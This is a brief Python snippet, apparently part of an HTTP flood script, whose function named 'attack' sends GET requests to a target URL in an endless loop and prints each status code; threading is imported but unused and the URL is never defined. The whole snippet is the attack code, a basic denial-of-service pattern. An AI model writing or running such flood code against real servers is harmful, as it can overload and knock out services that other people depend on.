import requests
import threading
def attack():
    while True:
        try:
            response = requests.get(url)
            print("Request sent:", response.status_code)
        except:
            print("Request failed")
